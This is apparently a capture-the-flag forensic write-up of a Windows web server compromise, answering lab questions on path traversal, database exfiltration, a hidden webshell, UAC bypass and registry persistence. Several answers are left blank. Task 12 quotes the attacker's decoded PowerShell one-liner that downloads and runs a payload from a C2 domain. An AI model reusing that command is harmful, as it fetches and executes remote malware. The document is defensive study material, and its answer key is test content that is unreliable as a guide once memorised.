# DFIR Report: LFIEscalationLab

| Metadata | Details |
|----------|---------|
| **Date** | 2026-01-03 |
| **Platform** | Windows |
| **Tasks** | 20 |

## 1. Scenario

IT staff reported unusual behavior on a workstation running a web application, triggered by an antivirus detection of a suspicious file. Early indicators suggest the website may have served as the entry point.Your task is to investigate the full scope of the compromise—tracing how the attacker gained access, what actions they performed, and how they established persistence on the system.

## 2. DFIR Summary


## 3. Challenge Solutions

### Task 1
**Question:** The threat actor began by probing the web application for hidden or accessible directories. Which IP address was responsible for this scanning activity?

**Answer:** `218.84.168.131`

**Explanation:**
Review Xampp logs. You will find malicious activity from that particular IP address.

> <img width="1369" height="26" alt="Q1_2" src="https://github.com/user-attachments/assets/16fa1a5c-cb97-4b8b-b2ef-a69db380fc90" />
---

### Task 2
**Question:** When was the threat actor's earliest recorded activity on the compromised website?

**Answer:** `2025-09-07 08:56`

**Explanation:**
Look for first log request for above IP address and convert the time stamp to UTC as the original time is in Japanese timestamp

---

### Task 3
**Question:** The threat actor rotated his User-Agent multiple times throughout the attack. How many User-Agents did the threat actor use during the first reconnaissance phase of the attack?

**Answer:** ``

**Explanation:**


> *Screenshot placeholder*
---

### Task 4
**Question:** A vulnerability was discovered in the old version of the website. How many files were read by the threat actor using the discovered vulnerability?

**Answer:** `4`

**Explanation:**
If you review logs with requests for oldsite/. Path traversal vulnerability is exploited to read four filesas shown in the screenshot

> <img width="631" height="98" alt="Q4" src="https://github.com/user-attachments/assets/0ef6c447-4e78-4f72-9008-f1cee65fb9b7" />
---

### Task 5
**Question:** The threat actor was able to access the MySQL database using credentials from one of the files he accessed earlier. What is the password that the threat actor used to access the MySQL database?

**Answer:** ``

**Explanation:**


> *Screenshot placeholder*
---

### Task 6
**Question:** When did the threat actor first successfully authenticate to the MySQL database?

**Answer:** ``

**Explanation:**


> *Screenshot placeholder*
---

### Task 7
**Question:** After authenticating to the MySQL database, the threat actor targeted a specific database for exfiltration. Which database did he access?

**Answer:** `vtubermusic`

**Explanation:** Reviewing Xampp logs would give you log requests with parameter database and table requests

> <img width="1448" height="15" alt="Q7" src="https://github.com/user-attachments/assets/ac276d31-8d82-48bc-b835-63c057648077" />
---

### Task 8
**Question:** Which table did the threat actor export from the database?

**Answer:** `users`

---

### Task 9
**Question:** On the next day, the threat actor logged into the MySQL database again using a different IP address. What is this IP address?

**Answer:** `182.44.8.254`

**Explanation:** Reviewing the logs would provide a different IP address making requests 


> *Screenshot placeholder*
---

### Task 10
**Question:** The threat actor used SQL commands to create a webshell. What is the full path of this webshell file on the system?

**Answer:** `C:\xampp\htdocs\config_old.php`

**Explanation:** one of thlogs provides insite that config_old.php is being hidden. Got to MFT records created with help of MFTECmd.exe and filter for config_old.php

> <img width="1379" height="98" alt="Q10_2" src="https://github.com/user-attachments/assets/c1bf594b-c12c-4c5e-8f29-03a431f3d017" />
---

### Task 11
**Question:** The threat actor used a Living-off-the-Land Binary (LOLBin) to hide the webshell. What MITRE ATT&CK technique corresponds to this activity?

**Answer:** `T1564.001`

**Explanation:** attrib is used to hide the file. This technique is called "Hide Artifacts: Hidden Files and Directories"

> <img width="583" height="81" alt="Q10_1" src="https://github.com/user-attachments/assets/ed75e47f-dbbc-4783-857d-76e74f9d8c3d" />
---

### Task 12
**Question:** The threat actor executed a command to download a reverse shell payload from a C2 server. What is the domain used to host this payload?

**Answer:** `wscryss.xyz`

**Explanation:** you will find follwoing log which has powershell request download in base64.

<img width="1462" height="16" alt="Q13_1" src="https://github.com/user-attachments/assets/2ffa07d7-3d46-4c45-b1d8-0d51ac47a6b4" />

Once you decode yoou find following code

Invoke-WebRequest -Uri "hxxp://wscryss.xyz/music.exe" -OutFile "$env:TEMP\music.exe"; Start-Process "$env:TEMP\music.exe" 
---

### Task 13
**Question:** The reverse shell payload was downloaded to a specific location and executed. What is the full path of this payload?

**Answer:** `C:\Users\hoshisora\AppData\Local\Temp\music.exe`

**Explanation:** Based on out discovery from previous powershell decode the path is "$env:TEMP\music.exe"
---

### Task 14
**Question:** After establishing the C2 connection, the threat actor attempted several methods to bypass User Account Control (UAC). One method used a PowerShell script. What is the name of this script?

**Answer:** `LykIsnWn.ps1`

**Explanation:**

> *Screenshot placeholder*
---

### Task 15
**Question:** The PowerShell script executed shellcode as part of its payload. What is the name of the variable that stores the raw shellcode in the script?

**Answer:** ``

**Explanation:**


> *Screenshot placeholder*
---

### Task 16
**Question:** After failing to bypass UAC, the threat actor downloaded another binary to authenticate as the compromised user. What is the original filename of this binary?

**Answer:** ``

**Explanation:**


> *Screenshot placeholder*
---

### Task 17
**Question:** What is the SHA-256 hash of the reverse-shell payload the threat actor uploaded and used with the previously identified binary?

**Answer:** ``

**Explanation:**


> *Screenshot placeholder*
---

### Task 18
**Question:** Which MITRE ATT&CK technique did the threat actor use to establish persistence through registry modifications that execute a payload upon a program's silent termination?

**Answer:** `T1546.012`

**Explanation:**

---

### Task 19
**Question:** Which program was configured to monitor and execute the threat actor's payload as part of his persistence mechanism?

**Answer:** ``

**Explanation:**


> *Screenshot placeholder*
---

### Task 20
**Question:** The persistence binary executed once on the compromised system. What was the process ID of this execution?

**Answer:** ``

**Explanation:**


> *Screenshot placeholder*
---




